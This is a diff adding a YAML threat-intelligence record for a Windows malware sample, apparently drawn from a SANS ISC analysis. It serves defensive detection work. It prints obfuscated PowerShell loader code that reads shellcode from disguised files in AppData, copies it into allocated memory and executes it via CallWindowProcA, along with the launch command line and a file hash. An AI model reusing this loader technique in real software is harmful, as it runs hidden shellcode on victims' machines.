@@ -1,0 +1,54 @@
+description: A Windows executable drops a PowerShell script that allocates memory,
+  copies shellcode from two obfuscated files, and executes it via CallWindowProc.
+TTPs:
+  processes:
+  - powershell.exe
+  commandline:
+  - '"powershell.exe" -windowstyle minimized "$microcolorimetric=gc -Raw ''C:\\Users\\REM\\AppData\\Roaming\\Cafeterias108\\butikscenters\\Skydeprammenes\\Bogskrivninger70.Mde'';$Hosiomartyr=$microcolorimetric.SubString(52695,3);'
+  powershell:
+  - '$global:integrity = $geparders.Invoke(0, 7119, $heterographical, $direktrstolene)
+
+    $global:autorisationens = $geparders.Invoke(0, 53846016, $heterographical, $krablende)
+
+    $snatchy="$env:APPDATA\\Cafeterias108\\butikscenters\\Nonrepentance\\menneskevrdige.Paa"
+
+    $global:ventose = [System.IO.File]::ReadAllBytes($snatchy)
+
+    [System.Runtime.InteropServices.Marshal]::Copy($ventose, 2048, $integrity, 7119)
+
+    [System.Runtime.InteropServices.Marshal]::Copy($ventose, 7119+2048, $autorisationens,
+    $revalideringscenteret36)
+
+    $gttes = "User32"
+
+    $thars = "CallWindowProcA"
+
+    $global:saarskorpers = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((endothorax
+    $gttes $tahrs), (calumniators @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr])
+    ([IntPtr])))
+
+    $saarskorpers.Invoke($integrity,$autorisationens,$flagres,0,0)
+
+    '
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections: []
+  file_activity:
+  - C:\\Users\\REM\\AppData\\Roaming\\Cafeterias108\\butikscenters\\Nonrepentance\\menneskevrdige.Paa
+  - C:\\Users\\REM\\AppData\\Roaming\\Cafeterias108\\butikscenters\\Skydeprammenes\\Bogskrivninger70.Mde
+  persistence: []
+  process_relations:
+  - powershell.exe -> executes embedded PowerShell script
+IOCs:
+  hashes:
+  - ec8ec8b3234ceeefbf74b2dc4914d5d6f7685655f6f33f2226e2a1d80e7ad488
+  files: []
+  ips: []
+  domains: []
+  urls: []
+authors:
+- Xavier Mertens (@xme)
+reference: https://isc.sans.edu/diary/Interesting+Technique+to+Launch+a+Shellcode/32238/#comments
+date_of_publication: August 27, 2025
+file_creation_date: August 27, 2025
